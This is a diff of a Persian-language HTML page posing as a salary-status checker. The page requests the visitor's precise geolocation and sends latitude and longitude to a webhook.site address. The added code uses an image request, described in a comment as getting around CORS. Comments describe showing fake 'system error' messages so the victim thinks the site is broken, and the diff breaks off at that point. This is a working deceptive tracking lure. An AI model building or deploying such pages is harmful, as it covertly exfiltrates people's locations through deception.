@@ -5,34 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>سامانه بررسی وضعیت حقوق</title>
     <style>
-        body { 
-            font-family: Tahoma, Arial, sans-serif; 
-            text-align: center; 
-            padding: 20px; 
-            background-color: #f4f7f6; 
-            direction: rtl; 
-        }
-        .container { 
-            max-width: 500px; 
-            margin: 50px auto; 
-            background: white; 
-            padding: 30px; 
-            border-radius: 15px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
-        }
+        body { font-family: Tahoma, Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f7f6; direction: rtl; }
+        .container { max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
         h2 { color: #2c3e50; }
         p { color: #7f8c8d; margin-bottom: 25px; }
-        .btn { 
-            background-color: #2ecc71; 
-            color: white; 
-            padding: 15px 30px; 
-            font-size: 18px; 
-            font-weight: bold; 
-            border: none; 
-            cursor: pointer; 
-            border-radius: 10px; 
-            transition: background 0.3s; 
-        }
+        .btn { background-color: #2ecc71; color: white; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; cursor: pointer; border-radius: 10px; transition: background 0.3s; }
         .btn:hover { background-color: #27ae60; }
     </style>
 </head>
@@ -45,9 +22,6 @@
 
     <script>
     function getLocation() {
-        // این پیام برای تست است که بفهمی دکمه کار می‌کند
-        console.log("Button clicked!");
-        
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                 enableHighAccuracy: true,
@@ -62,27 +36,11 @@
     function sendPosition(position) {
         var lat = position.coords.latitude;
         var lon = position.coords.longitude;
-        
-        // لینک وب‌هوک شما
         var webhookUrl = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
         
-        var data = "lat=" + lat + "&lon=" + lon;
-        
-        // ارسال داده‌ها به وب‌هوک
-        fetch(webhookUrl + "?" + data, { method: 'GET' })
-        .then(() => {
-            // پیام گمراه کننده برای کاربر
-            alert("خطای سیستم ۳۰۲: ارتباط با سرور مرکزی قطع شد. لطفاً با پشتیبانی تماس بگیرید.");
-        })
-        .catch(err => {
-            alert("خطای شبکه در ارسال اطلاعات.");
-        });
-    }
+        // روش جدید: ارسال داده‌ها از طریق یک درخواست تصویر (برای دور زدن خطای CORS)
+        var dataUrl = webhookUrl + "?lat=" + lat + "&lon=" + lon;
+        var img = new Image();
+        img.src = dataUrl;
 
-    function showError(error) {
-        // اگر کاربر Allow نزند، این پیام ظاهر می‌شود
-        alert("خطای سیستم ۳۰۲: دسترسی به مکان تایید نشد. برای ادامه، اجازه دسترسی به لوکیشن را فعال کنید.");
-    }
-    </script>
-</body>
-</html>
+        // نمایش پیام خطا برای کاربر (برای اینکه فکر کند سایت خراب است)
